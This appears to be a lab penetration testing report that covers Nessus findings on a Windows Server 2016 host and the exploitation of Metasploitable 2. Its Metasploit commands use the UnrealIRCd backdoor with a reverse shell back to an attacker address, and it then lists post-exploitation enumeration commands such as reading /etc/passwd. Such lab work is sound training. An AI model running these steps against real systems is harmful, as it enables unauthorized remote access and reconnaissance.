# Vulnerability Assessment and Penetration Testing Report

## Introduction
This report details the vulnerability assessment and penetration testing performed on two environments: a Windows Server 2016 instance and a Metasploitable 2 virtual machine. The objective of this assessment was to identify and exploit security vulnerabilities using Nessus and Metasploit, respectively.

## Methodology
The assessment was conducted using the following tools:
- **Nessus**: For vulnerability scanning and assessment.
- **Metasploit**: For exploitation of identified vulnerabilities.

The steps followed during the assessment include:
1. Setting up the target environments (Windows Server 2016 and Metasploitable 2).
2. Performing vulnerability scans using Nessus.
3. Analyzing the scan results to identify potential vulnerabilities.
4. Attempting to exploit identified vulnerabilities using Metasploit.

## Windows Server 2016 Findings
### Vulnerability Scan Results
The Nessus scan on the Windows Server 2016 instance revealed several vulnerabilities. However, none were classified as critical. The notable findings include:

1. **SMB Signing not required**
   - **Description**: Signing is not required on the remote SMB server. This can allow an unauthenticated, remote attacker to conduct man-in-the-middle attacks against the SMB server.
   - **Solution**: Enforce message signing in the host's configuration. On Windows, this is found in the policy setting 'Microsoft network server: Digitally sign communications (always)'.

2. **ICMP Timestamp Response**
   - **Description**: The remote host answers to an ICMP timestamp request. This allows an attacker to know the date set on the targeted machine, which may assist in defeating time-based authentication protocols.
   - **Solution**: Filter out the ICMP timestamp requests (13), and the outgoing ICMP timestamp replies (14).

### Recommendations
1. **SMB Signing**
   - Enforce SMB message signing to prevent man-in-the-middle attacks.
2. **ICMP Timestamp**
   - Filter ICMP timestamp requests and replies to avoid potential information disclosure.

## Metasploitable 2 Findings
### Vulnerability Scan Results
The Nessus scan on the Metasploitable 2 virtual machine revealed multiple critical vulnerabilities. One such vulnerability was exploited using Metasploit.

### Exploitation Process
1. **UnrealIRCD 3.2.8.1 Backdoor Command Execution (CVE-2010-2075)**
   - **Description**: UnrealIRCd 3.2.8.1 contains a backdoor that allows remote command execution.
   - **Exploit Steps**:
     ```bash
     msfconsole
     search unreal_ircd
     use exploit/unix/irc/unreal_ircd_3281_backdoor
     set RHOST <192.168.74.129>
     set payload cmd/unix/reverse
     set LHOST <192.168.74.131>
     set LPORT 4444
     exploit
     ```
   - **Outcome**: Successful exploitation resulted in a command shell session.
     ```bash
     Command shell session 1 opened (192.168.74.131:4444 -> 192.168.74.129:46823)
     ```

### Post-Exploitation Steps
- **Verify Access**:
  ```bash
  Whoami
**Gather System Information**:
 uname -a
 hostname
 ifconfig
**Enumerate Users and Groups**:
 cat /etc/passwd
 cat /etc/group
**Check for Network Connections**:
netstat -tulnp
**Identify Installed Software**:
 dpkg -l
 ```
